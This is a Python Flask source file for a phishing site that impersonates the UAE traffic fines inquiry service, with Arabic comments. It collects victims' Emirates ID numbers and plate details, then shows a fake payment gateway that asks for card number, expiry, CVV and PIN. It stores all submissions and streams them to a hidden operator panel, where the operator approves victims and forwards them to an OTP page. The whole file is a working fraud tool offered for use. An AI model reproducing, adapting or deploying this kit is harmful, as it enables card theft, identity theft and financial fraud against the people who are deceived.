import os
from flask import Flask, render_template_string, request, jsonify, redirect

app = Flask(__name__)

# قاعدة بيانات مؤقتة للتحكم الحي
db = {
    "captured_data": [],
    "current_status": "waiting", # waiting, approved, rejected
    "next_step": "/card-info",
    "error_message": ""
}

# --- 1. الصفحة الرئيسية (ضبط الإحداثيات بناءً على الصورة) ---
HOME_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html { margin: 0; padding: 0; width: 100%; background: #f4f4f4; }
        .wrapper { position: relative; max-width: 500px; margin: 0 auto; }
        .wrapper img { width: 100%; display: block; }
        .sticky-nav { position: sticky; top: 0; z-index: 100; background: white; width: 100%; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        
        /* الأزرار الشفافة فوق صورة الوزارة */
        .action-btn { position: absolute; left: 10%; width: 80%; height: 45px; background: rgba(255,0,0,0); cursor: pointer; border: none; }
        .btn-start { top: 275px; } /* فوق ابدأ الخدمة */
        .btn-new { top: 315px; }   /* فوق مستخدم جديد */
    </style>
</head>
<body>
    <div class="sticky-nav"><img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" style="width:100%;"></div>
    <div class="wrapper">
        <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg">
        
        <button class="action-btn btn-start" onclick="location.href='/search'"></button>
        <button class="action-btn btn-new" onclick="location.href='/search'"></button>
        
        <img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_dc754b0143e14766a16919be2a1ee249~mv2.jpg">
    </div>
</body>
</html>
"""

# --- 2. صفحة الاستعلام (النسخة الرسمية - السبع إمارات) ---
SEARCH_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <style>
        body { background: #f0f0f0; font-family: 'Segoe UI', Tahoma; margin: 0; }
        .card { background: white; max-width: 550px; margin: 20px auto; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); overflow: hidden; }
        .header { background: #b0914f; color: white; padding: 20px; text-align: center; font-size: 18px; font-weight: bold; }
        .form { padding: 25px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #444; }
        select, input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 5px; font-size: 15px; }
        .plate-box { display: flex; gap: 10px; }
        .btn-submit { background: #b0914f; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <img src="https://static.wixstatic.com/media/a9f3d9_8d6f26f6414147ecabf30b40b9a97f09~mv2.jpg" style="width:100%;">
    <div class="card">
        <div class="header">نظام الاستعلام عن المخالفات المرورية</div>
        <form action="/process-search" method="POST" class="form">
            <label>إمارة مصدر اللوحة / Plate Source:</label>
            <select name="emirate">
                <option>أبوظبي / Abu Dhabi</option>
                <option>دبي / Dubai</option>
                <option>الشارقة / Sharjah</option>
                <option>عجمان / Ajman</option>
                <option>أم القيوين / Umm Al Quwain</option>
                <option>رأس الخيمة / Ras Al Khaimah</option>
                <option>الفجيرة / Fujairah</option>
            </select>

            <label>بيانات اللوحة / Plate Details:</label>
            <div class="plate-box">
                <select name="category" style="flex:1;"><option>خصوصي</option><option>نقل عام</option></select>
                <input type="text" name="code" placeholder="الرمز / Code" style="flex:1;">
                <input type="text" name="number" placeholder="رقم اللوحة / Plate No" style="flex:2;">
            </div>

            <label>رقم الهوية / Emirates ID:</label>
            <input type="text" name="eid" placeholder="784-XXXX-XXXXXXX-X" required>

            <button type="submit" class="btn-submit">بحث عن المخالفات</button>
        </form>
    </div>
</body>
</html>
"""

# --- 3. صفحة الدفع (بشعار الفيزا والماستر) ---
PAY_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    .pay-card { max-width: 400px; margin: 30px auto; background: white; padding: 30px; border-radius: 15px; border: 1px solid #b0914f; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
    input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
    .card-row { display: flex; gap: 10px; }
    .btn-pay { background: #b0914f; color: white; width: 100%; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
    #logo { height: 30px; margin-bottom: 10px; display: none; }
</style></head>
<body>
    <div class="pay-card">
        <h3 style="color:#b0914f; text-align:center;">بوابة الدفع الإلكتروني</h3>
        <img id="logo" src="">
        <form action="/capture-card" method="POST">
            <input type="text" id="cn" name="card" placeholder="رقم البطاقة" maxlength="19" required>
            <div class="card-row">
                <input type="text" name="exp" placeholder="MM/YY" maxlength="5">
                <input type="text" name="cvv" placeholder="CVV" maxlength="3">
            </div>
            <input type="password" name="pin" placeholder="الرقم السري للبطاقة (PIN)">
            <button type="submit" class="btn-pay">تأكيد عملية السداد</button>
        </form>
    </div>
    <script>
        document.getElementById('cn').addEventListener('input', function(e) {
            let v = e.target.value;
            let img = document.getElementById('logo');
            if(v.startsWith('4')) { img.src='https://img.icons8.com/color/48/visa.png'; img.style.display='block'; }
            else if(v.startsWith('5')) { img.src='https://img.icons8.com/color/48/mastercard.png'; img.style.display='block'; }
            e.target.value = v.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
        });
    </script>
</body>
</html>
"""

# --- 4. لوحة التحكم (الرابط: /h-panel) ---
ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head><style>
    body { background: #1a1a1a; color: white; font-family: sans-serif; padding: 20px; }
    .log { background: #333; padding: 15px; border-radius: 8px; margin-bottom: 10px; border-left: 5px solid gold; }
    button { padding: 10px 20px; margin: 5px; cursor: pointer; font-weight: bold; }
</style></head>
<body>
    <h2>لوحة تحكم القائد حسن 👮‍♂️</h2>
    <div id="display"></div>
    <script>
        function refresh() {
            fetch('/get-logs').then(r => r.json()).then(data => {
                let html = '';
                data.logs.forEach(log => {
                    html += `<div class="log">
                        <p>${JSON.stringify(log)}</p>
                        <button style="background:green; color:white;" onclick="action('approved','/otp-page')">موافق</button>
                        <button style="background:red; color:white;" onclick="action('rejected','','البيانات خطأ')">رفض</button>
                    </div>`;
                });
                document.getElementById('display').innerHTML = html;
            });
        }
        function action(s, n, m) {
            fetch('/set-action', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({status:s, next:n, msg:m})});
        }
        setInterval(refresh, 2000);
    </script>
</body>
</html>
"""

# --- مسارات السيرفر ---

@app.route('/')
def index(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML)

@app.route('/card-info')
def card_info(): return render_template_string(PAY_HTML)

@app.route('/process-search', methods=['POST'])
def proc_search():
    db['captured_data'].insert(0, request.form.to_dict())
    return redirect('/card-info') # تحويل مباشر لصفحة الدفع بعد الاستعلام

@app.route('/capture-card', methods=['POST'])
def cap_card():
    db['captured_data'].insert(0, request.form.to_dict())
    return "<h2>جاري معالجة الطلب...</h2>"

@app.route('/get-logs')
def get_logs(): return jsonify({"logs": db['captured_data']})

@app.route('/set-action', methods=['POST'])
def set_act():
    req = request.json
    db['current_status'] = req['status']
    return "OK"

@app.route('/h-panel')
def admin(): return render_template_string(ADMIN_HTML)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
